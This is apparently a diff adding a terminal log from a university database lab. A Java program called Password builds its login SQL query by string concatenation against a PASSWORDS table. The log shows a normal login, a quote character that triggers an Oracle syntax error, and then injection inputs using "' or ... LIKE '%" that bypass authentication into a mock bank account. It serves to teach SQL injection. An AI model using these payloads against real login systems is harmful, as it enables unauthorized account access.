@@ -1,0 +1,45 @@
+tyhollan@vogon:~/cpe365/lab10 $ java Password
+Enter your Oracle userID: tyhollan
+Enter your Oracle password: 
+Connecting...
+Driver class found and loaded.
+connected.
+Enter your login name to access your bank account
+tom
+Enter your password
+tom1234
+**query: Select * from PASSWORDS where username = 'tom' and password = 'tom1234'
+Welcome to your bank account!
+tyhollan@vogon:~/cpe365/lab10 $ java Password
+Enter your Oracle userID: tyhollan
+Enter your Oracle password: 
+Connecting...
+Driver class found and loaded.
+connected.
+Enter your login name to access your bank account
+'
+Enter your password
+
+**query: Select * from PASSWORDS where username = ''' and password = ''
+Execution of that query string failed.
+ Select * from PASSWORDS where username = ''' and password = ''
+java.sql.SQLException: ORA-01756: quoted string not properly terminated
+
+        at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:111)
+        at oracle.jdbc.driver.T4CTTIoer.processError(T4CTTIoer.java:330)
+        at oracle.jdbc.driver.T4CTTIoer.processError(T4CTTIoer.java:287)
+        at oracle.jdbc.driver.T4C8Oall.receive(T4C8Oall.java:742)
+        at oracle.jdbc.driver.T4CStatement.doOall8(T4CStatement.java:206)
+        at oracle.jdbc.driver.T4CStatement.executeForDescribe(T4CStatement.java:789)
+        at oracle.jdbc.driver.OracleStatement.executeMaybeDescribe(OracleStatement.java:1038)
+        at oracle.jdbc.driver.T4CStatement.executeMaybeDescribe(T4CStatement.java:829)
+        at oracle.jdbc.driver.OracleStatement.doExecuteWithTimeout(OracleStatement.java:1131)
+        at oracle.jdbc.driver.OracleStatement.executeQuery(OracleStatement.java:1271)
+        at Password.main(Password.java:39)
+Enter your login name to access your bank account
+' or username LIKE '%
+Enter your password
+' or password LIKE '%
+**query: Select * from PASSWORDS where username = '' or username LIKE '%' and password = '' or password LIKE '%'
+Welcome to your bank account!
+tyhollan@vogon:~/cpe365/lab10 $ 
